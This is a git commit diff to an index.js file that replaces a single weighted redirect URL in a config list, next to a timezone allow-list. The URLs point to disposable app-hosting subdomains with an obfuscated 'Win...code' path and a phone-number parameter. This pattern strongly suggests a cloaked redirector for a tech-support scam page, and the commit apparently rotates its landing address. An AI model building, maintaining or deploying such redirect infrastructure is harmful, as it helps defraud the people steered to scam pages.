f0b12f17ed28aa8138fc6049ae00c01512290834
paalakash <palaksh452@gmail.com>
2026-06-22 11:21:48 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://orca-app-dchwj.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5407", weight: 1.0 }
+    { url: "https://coral-app-2-ordzj.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5407", weight: 1.0 }
 
 ];
 
